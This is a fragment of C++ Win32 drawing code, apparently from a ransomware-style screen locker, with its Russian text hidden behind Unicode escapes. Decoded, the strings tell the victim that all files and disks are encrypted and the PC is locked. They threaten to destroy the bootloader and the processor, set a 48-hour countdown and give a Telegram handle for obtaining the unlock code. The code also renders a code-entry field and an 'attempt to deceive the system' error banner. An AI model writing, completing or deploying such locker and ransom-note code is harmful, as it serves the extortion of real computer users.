            // Плашка сверху
            RECT whiteRect = {200, 100, 800, 130};
            HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
            FillRect(hdc, &whiteRect, whiteBrush);
            DeleteObject(whiteBrush);
            SetTextColor(hdc, RGB(0, 0, 0));
            // " Ваши файлы зашифрованы! "
            DrawTextW(hdc, L"\u0412\u0430\u0448\u0438 \u0444\u0430\u0439\u043b\u044b \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b!", -1, &whiteRect, DT_CENTER | DT_VCENTER);
            
            SetTextColor(hdc, RGB(255, 255, 255));
            RECT textRect = {200, 150, 800, 400};
            
            // Основной текст (кодированный)
            const wchar_t* bsod_text = 
                L"\u0423\u043f\u0441! \u0412\u044b \u043f\u043e\u0434\u0432\u0435\u0440\u0433\u043b\u0438\u0441\u044c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0439 \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439 \u0430\u0442\u0430\u043a\u0435 \u0438 \u0442\u0435\u043f\u0435\u0440\u044c \u0412\u0430\u0448 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\n"
                L"\u0437\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u043d, \u0430 \u0432\u0441\u0435 \u0438\u043c\u0435\u044e\u0449\u0438\u0435\u0441\u044f \u0434\u0438\u0441\u043a\u0438 \u0438 \u0444\u0430\u0439\u043b\u044b \u043d\u0430 \u043d\u0438\u0445 \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439\n"
                L"\u0433\u0440\u0443\u043f\u043f\u0438\u0440\u043e\u0432\u043a\u043e\u0439. \u041b\u044e\u0431\u044b\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f, \u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0435 \u0441 \u043f\u043e\u043f\u044b\u0442\u043a\u043e\u0439 \u043e\u0431\u043c\u0430\u043d\u0443\u0442\u044c \u0441\u0438\u0441\u0442\u0435\u043c\u0443,\n"
                L"\u043d\u0430\u043d\u0435\u0441\u0443\u0442 \u043d\u0435\u043f\u043e\u043f\u0440\u0430\u0432\u0438\u043c\u044b\u0439 \u0432\u0440\u0435\u0434 \u0432\u0430\u0448\u0435\u043c\u0443 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u0443 \u0438 \u043f\u0440\u0438\u0432\u0435\u0434\u0443\u0442 \u043a \u043f\u043e\u0442\u0435\u0440\u0435 \u0432\u0441\u0435\u0445\n"
                L"\u0432\u0430\u0436\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445 \u0431\u0435\u0437 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f.\n"
                L"\u0411\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0443 \u0433\u043b\u0430\u0432\u043d\u044b\u0439 \u0437\u0430\u0433\u0440\u0443\u0437\u0447\u0438\u043a \u043c\u0430\u0442\u0435\u0440\u0438\u043d\u043a\u0438 \u0431\u0443\u0434\u0435\u0442 \u0441\u043d\u0435\u0441\u0451\u043d, \u0431\u0443\u0434\u0435\u0442 \u043f\u043e\u0434\u0430\u043d\u0430\n"
                L"\u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u0430\u044f \u043d\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043d\u0430 \u0432\u0430\u0448 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440, \u0447\u0442\u043e \u043f\u0440\u0438\u0432\u0435\u0434\u0435\u0442 \u043a \u0435\u0433\u043e \u043d\u0435\u0438\u0441\u043f\u0440\u0430\u0432\u043d\u043e\u0441\u0442\u0438.\n"
                L"\u0423 \u0432\u0430\u0441 \u0435\u0441\u0442\u044c 48 \u0447\u0430\u0441\u043e\u0432 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0437\u0430\u043f\u0443\u0441\u043a\u0430 \u0447\u0442\u043e\u0431\u044b \u0432\u0432\u0435\u0441\u0442\u0438 \u043a\u043e\u0434,\n"
                L"\u0447\u0442\u043e \u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434, \u043d\u0430\u043f\u0438\u0448\u0438               @opka8       (Telegram)";
            
            DrawTextW(hdc, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
            
            RECT inputRect = {200, 410, 800, 435};
            HBRUSH inputBrush = CreateSolidBrush(RGB(255, 255, 255));
            FillRect(hdc, &inputRect, inputBrush);
            DeleteObject(inputBrush);
            SetTextColor(hdc, RGB(0, 0, 0));
            
            // "Введите код разблокировки: "
            std::wstring display = L"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0438: " + input_text;
            DrawTextW(hdc, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

            SetTextColor(hdc, RGB(255, 255, 255));
            RECT bottomRect = {200, 650, 800, 680};
            std::wstring bottom = L"Current PC: " + pc_name;
            DrawTextW(hdc, bottom.c_str(), -1, &bottomRect, DT_LEFT);
            
            int hrs = time_left / 3600;
            int mins = (time_left % 3600) / 60;
            int secs = time_left % 60;
            wchar_t timer_buf[100];
            // "ОСТАЛОСЬ ВРЕМЕНИ: %02d:%02d:%02d"
            swprintf_s(timer_buf, L"\u041e\u0421\u0422\u0410\u041b\u041e\u0421\u042c \u0412\u0420\u0415\u041c\u0415\u041d\u0418: %02d:%02d:%02d", hrs, mins, secs);
            SetTextColor(hdc, RGB(0, 255, 0));
            RECT timerRect = {200, 680, 800, 710};
            DrawTextW(hdc, timer_buf, -1, &timerRect, DT_LEFT);

            if (show_error) {
                RECT errRect = {400, 300, 900, 400};
                HBRUSH redBrush = CreateSolidBrush(RGB(204, 0, 0));
                FillRect(hdc, &errRect, redBrush);
                DeleteObject(redBrush);
                SetTextColor(hdc, RGB(255, 255, 255));
                // "Замечена и остановлена попытка обмануть систему!"
                DrawTextW(hdc, L"\u0417\u0430\u043c\u0435\u0447\u0435\u043d\u0430 \u0438 \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0430 \u043f\u043e\u043f\u044b\u0442\u043a\u0430\n\u043e\u0431\u043c\u0430\u043d\u0443\u0442\u044c \u0441\u0438\u0441\u0442\u0435\u043c\u0443!", -1, &errRect, DT_CENTER | DT_VCENTER);
            }
